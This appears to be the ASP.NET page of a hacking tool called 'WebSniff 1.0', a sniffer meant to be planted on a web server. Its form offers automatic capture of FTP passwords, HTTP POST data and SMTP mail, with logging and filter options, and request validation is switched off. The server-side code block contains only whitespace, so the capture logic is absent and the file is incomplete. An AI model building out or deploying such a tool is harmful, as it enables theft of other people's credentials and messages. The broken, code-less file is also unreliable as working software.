<%@ Page Language="C#" ValidateRequest="false" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Collections" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Net.NetworkInformation" %>
<%@ Import Namespace="System.Threading" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
<title>Web Sniffer</title>
</head>
<body>

<script runat="server">

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
</script>

<style type="text/css">
<!--
a {color: #FF0000;text-decoration: none}
#tt {vertical-align: middle;font-size: 12pt;text-align: center;}
#Ct_2 {padding-left:30px;font-size: 10pt;color: #336699;vertical-align: middle;text-align: left;background-color: aliceblue;border-width: 1px;border-style: solid;border-color: -moz-use-text-color;padding-bottom:10px;}
-->
</style>
<form id="form1" runat="server">
<div id="tt">  <b> WebSniff 1.0</b><br /><br /></div>
<div id="Ct_2" >
    <table width="100%" >
      <tr >
            <td  width="10%"> BindIP: </td>
            <td ><asp:DropDownList ID="ddlist" runat="server" width="90%"></asp:DropDownList></td>
        </tr>
      <tr >
            <td  width="10%">Auto sniff: </td>
            <td >
            FTP Password:
             <asp:CheckBox ID="s_ftp" runat="server" Checked />
             &nbsp;&nbsp;
             HTTP Post Data:
              <asp:CheckBox ID="s_http_post" runat="server" />
              &nbsp;&nbsp;
              Smtp Data:
               <asp:CheckBox ID="s_smtp" runat="server" />
            </td>
        </tr>
        <tr>
            <td ">
                FilterPort:
            </td>
            <td>
                <asp:TextBox ID="txtport" Text="0"  width="90%" runat="server"></asp:TextBox>
            </td>
        </tr>
        <tr>
            <td >
                MiniSizeToCapture:
            </td>
            <td >
                <asp:TextBox ID="txtMinisize" Text="0"  width="90%" runat="server" ></asp:TextBox>
            </td>
        </tr>
        <tr>
            <td>
                KeyWordsFilter:
            </td>
            <td>
                <asp:TextBox ID="txtkeywords" runat="server"   width="90%" Text=""></asp:TextBox>
            </td>
        </tr>
        <tr>
            <td >
                LogFile:
            </td>
            <td>
                <asp:TextBox ID="txtlogfile" runat="server"   width="90%" Text="log.log" ></asp:TextBox>
            </td>
        </tr>
        <tr>
            <td >
                Stop At Time:
            </td>
            <td>
                <asp:TextBox ID="txtpackets" runat="server"  width="90%" Text="300"></asp:TextBox>
            </td>
        </tr>
       <tr>
            <td >
                    Control:
            </td>
            <td   width="90%" >   <asp:Button ID="Starts" runat="server" OnClick="Start_Click" Text="Start" />
            <asp:Button ID="Button1" runat="server" OnClick="Stop_Click" Text="Stop" />
                  <asp:Button ID="Button_ref" runat="server" OnClick="Refresh_Click" Text="Refresh/View Status" /><br />
            </td>
        </tr>
       <tr>
            <td  >
                    Status:
            </td>
            <td   width="90%"><div id="s"><asp:Label ID="Lb_msg" runat="server" Text=""></div></asp:Label>
            </td>
        </tr>

       <tr>
            <td  >
                    
            </td>
            <td   width="90%"><div id="s"><asp:Label ID="Lb_msg2" runat="server" Text=""></div></asp:Label>
            </td>
        </tr>
    </table>
    </div><br /><br />
</form>
</body>
</html>